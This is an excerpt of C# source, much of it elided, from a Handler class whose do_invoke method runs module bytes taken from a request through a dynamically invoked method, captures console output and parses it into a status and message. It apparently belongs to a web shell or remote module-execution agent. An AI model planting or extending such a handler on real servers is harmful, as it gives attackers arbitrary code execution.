   ...
   public class Handler
    {
        ...
        private string do_invoke(Dictionary<string, string> unpacked_request)
        {
            ...
            try
            {
                ...
                object[] objArr = new object[] { mod_cwd, mod_raw_args, mod_token };
                ...
                using(StringWriter writer = new StringWriter())
                {
                    ...
                    object mod_assembly_result = dynamicMethod.Invoke(null, new object[] { mod_content_bytes, obj, objArr });

                    writer.Flush();

                    as_response = writer.GetStringBuilder().ToString();
                }

                Console.SetOut(originalConsoleOut);


                string[] as_response_lines = as_response.Split('\n');
                if (as_response_lines.Length <= 2)
                    return generate_response(ERR_CODE, ERR_INVALID_MOD_RESPONSE);

                string status_code = as_response_lines[0].Trim();
                string message     = "";
                
                for (int i = 1; i < as_response_lines.Length; i++)
                    if (i == (as_response_lines.Length - 1))
                        message += as_response_lines[i];
                    else
                        message += as_response_lines[i] + Environment.NewLine;
